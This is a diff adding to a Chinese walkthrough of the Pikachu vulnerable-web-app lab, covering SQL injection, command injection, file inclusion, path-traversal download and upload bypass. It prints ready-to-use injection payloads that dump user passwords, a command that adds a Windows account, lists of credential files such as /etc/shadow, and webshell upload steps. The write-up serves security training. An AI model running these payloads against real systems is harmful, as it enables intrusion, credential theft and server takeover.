@@ -427,7 +427,7 @@ scrf防御思路：
 
 3）Token：Token是一串足够长且复杂的随机数，Token防御CSRF的本质就是让请求参数不可被预测，不能被预测也就意味着攻击者不能构造出恶意数据包请求。
 
-## 四、Sql Inject(SQL注入)
+# 四、Sql Inject(SQL注入)
 
 SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：
         1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；
@@ -545,4 +545,406 @@ name=1' union select 1,CHAR(60, 63, 112, 104, 112, 32, 101, 118, 97, 108, 40, 36
 输入name=1%'-- ，数据返回正常，结果与name=1一致，说明payload已经拼接了；
 
 name=1%' order by 3 -- 正常 name=1%' order by 4 -- 报错，说明列数为3。接下来不多说，攻击方法跟之前的一样。
+
+## 4、xx型注入
+
+直接上单引号
+
+![1569828201205](/图片/1569828201205.png)
+
+上单引号加并注释掉后面的内容发现
+
+![1569828309324](/图片/1569828309324.png)
+
+说明单单使用单引号的闭合不了语句，还有其他符号，我们发现第一个提示中有个括号，很大可能这个闭合与括号有关
+
+使用：1')-- ，发现成功
+
+![1569828471538](/图片/1569828471538.png)
+
+## 5、"insert/update/delete"注入
+
+​	   之前的注入都是基于select查询语句来注射的，这里将介绍一个基于insert/update/delete语句的注射。
+
+### 1）注释语法 
+
+​      这里使用显错模式 ,思路是在语句中构造语法错误，利用语句是如下
+
+```sql
+insert into users (id, username, password) values (2,''inject here'','Olivia');
+insert into users (id, username, password) values (2,""inject here"",'Olivia');
+```
+
+### 2）updatexml()获取数据
+
+updatexml()函数是mysql对xml文档数据进行查询和修改的XPATH函数。
+
+payload：
+or updatexml(1,concat(0x7e,(version())),0) or 
+
+a 、insert:
+
+闭合引号
+
+' or updatexml(1,concat(0x7e,(version())),0) or '
+
+![1570520897542](/图片/1570520897542.png)
+
+![1570520845180](/图片/1570520845180.png)
+
+b、update：
+
+payload 和insert的一样都是' or updatexml(1,concat(0x7e,(version())),0) or '
+
+![1570521128900](/图片/1570521128900.png)
+
+c、delete:
+
+id=13964 or updatexml(1,concat(0x7e,(version())),0) or ‘’
+
+![1570520664551](/图片/1570520664551.png)
+
+这三个操作基本一样接下来只展示update获取数据
+
+获取当前数据库的所有表名：
+
+ `or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),0) or` 
+
+获取当前数据库users表的所有列名：
+
+ `or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database())),0) or`
+
+获取users表的username,password列的数据
+
+`or updatexml(1,concat(0x7e,(select group_concat(username,' : ',password) from pikachu.users )),0) or` 
+
+
+
+### 3）extractvalue()获取数据
+
+payload：
+
+```
+or extractvalue(1,concat(0x7e,database())) or
+```
+
+### 4）name_const()获取数据
+
+Payload：
+
+```
+or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or
+```
+
+### 5）利用子查询注入
+
+payload
+
+```
+or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or
+```
+
+### 6）更多闭合变种
+
+```
+' or (payload) or '
+' and (payload) and '
+' or (payload) and '
+' or (payload) and '='
+'* (payload) *'
+' or (payload) and '
+" – (payload) – "
+```
+
+### 7）引用
+
+http://www.vuln.cn/6772
+
+## 6、http头注入
+
+### 1）常见的http头部注入参数
+
+User-Agent:识别客户使用的操作系统，游览器版本等
+
+Cookie:网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据
+
+X-Forwarded-For:HTTP的请求端真实的IP
+
+Client-IP:同上
+
+Host:客户端访问的web服务器域名/ip地址和端口号
+
+。。。。。。
+
+### 2）insert型注入http头
+
+由于这里的sql语句如下是insert型http头部注入
+
+```php
+$query="insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')";
+$result=execute($link, $query);
+```
+
+所以使用工具hackerbar对user-agent注入
+
+payload：1' or updatexml(1,concat(0x7e,(version())),0) or'
+
+![1570601568107](/图片/1570601568107.png)
+
+## 7、基于boolean的盲注
+
+盲注：在某些情况下后台对报错信息进行屏蔽，此时无法再根据信息来判断注入，这种情况下的注入称为盲注，盲注又分为基于布尔型盲注和基于时间的盲注。
+
+基于boolean的盲注主要表现症状：
+①没有报错信息
+②不管是正确的输入，还是错误的输入，都只显示两种情况（我们可以认为是1或者0）
+③在正确的输入下，输入and 1=1/and 1=2可以发现判断
+
+
+
+接下来打开靶机，发现熟悉的输入框，输入单引号显示username不存在，输入其他字符同样提示不存在
+
+![1570605131579](/图片/1570605131579.png)
+
+这里面是有点奇葩的，只有输入存在的用户名才会显示一下信息。其中一个存在的用户名是kobe,所以接下来的注入得依赖这个用户名。
+
+![1570605599135](/图片/1570605599135.png)
+
+接下来我输入kobe'-- 显示username不存在 
+
+输入kobe' and 1=1-- 显示了用户id和email
+
+输入kobe' and 1=2-- 显示username不存在 
+
+到这里我们就可以判断存在盲注了。
+
+其实，在这里我思考可不可以不依赖存在的用户，我考虑使用异或 false xor true 为true来绕过，
+
+比如： a' xor 1=1-- ，不存在用户a所以为假，1=1为真，假异或真为真。结果是自己的痴心妄想hh,然后好奇看了源码发现还有一个判断。
+
+![1570615391934](/图片/1570615391934.png)
+
+
+
+### 1）猜库名
+
+库名长度：kobe' and length(database())>1-- 
+
+我们可以使用burpsuit半自动化工具去跑，长度结果为7
+
+![1570612179146](/图片/1570612179146.png)
+
+![1570612293430](/图片/1570612293430.png)
+
+![1570611873375](/图片/1570611873375.png)
+
+猜库名，kobe'and (ascii(substr(database(),1,1))>112)-- 得出ascci码为：112，105，107，97，99，104，117转化为字符串pikachu
+
+![1570612563864](/图片/1570612563864.png)
+
+### 2）猜表名
+
+kobe'and (ascii(substr(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1,1))>1)-- 
+
+![1570619744910](/图片/1570619744910.png)
+
+得到
+
+126  104  116   116   112  105  110  102  111 ...............
+
+~httpinfo,member,message,users,x
+
+### 3）猜列名
+
+kobe'and (ascii(substr(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database())),1,1))>1)-- 
+
+### 4)猜记录
+
+kobe'and (ascii(substr(concat(0x7e,(select group_concat(username,' : ',password) from pikachu.users )),1,1))>1)-- 
+
+盲注手工操作真的是繁琐，要崩溃了qaq。
+
+## 8、基于时间的盲注
+
+## 9、宽字节注入
+
+# 五、RCE
+
+RCE(remote command/code execute)概述
+
+RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。                     
+
+**远程系统命令执行**
+ 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口,比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器，现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过"自动化运维平台"进行操作。                         在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的"收获"-_-                     
+
+**远程代码执行**
+同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 
+
+因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。           
+
+## 1、exec "ping"
+
+在命令执行漏洞中我们可以尝试&、&&、|、||、;等符号拼接执行命令。
+
+输入127.0.0.1|ipconfig
+
+![1570676476964](/图片/1570676476964.png)
+
+输入127.0.0.1 | net user hack 123 /add,可添加用户。
+
+源码中直接拼接语句
+
+![1570676899733](/图片/1570676899733.png)
+
+## 2、exec "eval"
+
+输入phpinfo();
+
+![1570676621703](/图片/1570676621703.png)
+
+源码中eval()处理字符串里面的表达式
+
+`if(isset($_POST['submit']) && $_POST['txt'] != null){`
+
+​    `if(@!eval($_POST['txt'])){`
+
+​        `$html.="<p>你喜欢的字符还挺奇怪的!</p>";`
+
+
+
+# 六、File Inclusion
+
+File Inclusion(文件包含漏洞)概述
+
+文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。比如 在PHP中，提供了：
+
+<u>include(),include_once()</u>
+<u>require(),require_once()</u>
+这些文件包含函数，这些函数在代码设计中被经常使用到。
+ 大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。                         根据不同的配置环境，文件包含漏洞分为如下两种情况：
+**1.本地文件包含漏洞：**仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。
+ **2.远程文件包含漏洞：**能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。
+
+因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。                             
+
+## 1、本地文件包含
+
+首先随意提交一个下拉菜单的选项，观察url,发现包含一个文件名，很可能存在一个文件包含漏洞。
+
+![1570678070307](/图片/1570678070307.png)
+
+在根目录下新建一个<?php phpinfo(); ?>的1.php文件。
+
+输入../../../../../../../.././1.php提交发现文件被执行。
+
+![1570678436215](/图片/1570678436215.png)
+
+**常见的敏感信息路径：**
+
+Windows系统
+
+> c:\boot.ini // 查看系统版本
+>
+> c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
+>
+> c:\windows\repair\sam // 存储Windows系统初次安装的密码
+>
+> c:\ProgramFiles\mysql\my.ini // MySQL配置
+>
+> c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
+>
+> c:\windows\php.ini // php 配置信息
+
+Linux/Unix系统
+
+> /etc/passwd // 账户信息
+>
+> /etc/shadow // 账户密码文件
+>
+> /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
+>
+> /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
+>
+> /usr/local/app/php5/lib/php.ini // PHP相关配置
+>
+> /etc/httpd/conf/httpd.conf // Apache配置文件
+>
+> /etc/my.conf // mysql 配置文件
+
+## 2、远程文件包含
+
+PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。
+
+allow_url_fopen = On：是否允许打开远程文件
+
+allow_url_include = On：是否允许include/require远程文件
+
+?filename=http://www.baidu.com&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
+
+![1570679816067](/图片/1570679816067.png)
+
+
+
+# 七、unsafe filedownload
+
+文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。 所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！                     
+
+
+
+设置抓包点击名字的下载链接，
+
+![1570689300428](/图片/1570689300428.png)
+
+修改文件名为../../../../../../../1.php
+
+![1570689429124](/图片/1570689429124.png)
+
+![1570689491571](/图片/1570689491571.png)
+
+下载成功。
+
+# 八、unsafe upfileupload
+
+文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。                     
+
+所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：
+ --验证文件类型、后缀名、大小;
+--验证文件的上传方式;
+ --对文件进行一定复杂的重命名;
+--不要暴露文件上传后的路径;
+--等等...
+
+## 1、客户端check
+
+![1570693595585](/图片/1570693595585.png)
+
+这里的上传是通过前端判断文件后缀名来区别是否为图片。
+
+上传前把木马文件后缀名改为jpg格式，上传拦截抓包，然后修改文件后缀名发送
+
+![1570690681606](/图片/1570690681606.png)
+
+![1570690791710](/图片/1570690791710.png)
+
+接下来可以使用菜刀连接了。
+
+![1570699659889](/图片/1570699659889.png)
+
+## 2、服务端check
+
+MIME type检测是检测Content-type,上传1.php,抓包，将Content-type的内容改为image/jpeg。上传成功，返回路径。
+
+![1570702641129](/图片/1570702641129.png)
+
+## 3、getimagesize()
+
+
+
+![1570703871101](/图片/1570703871101.png)
+
+
+
+
+
+
 
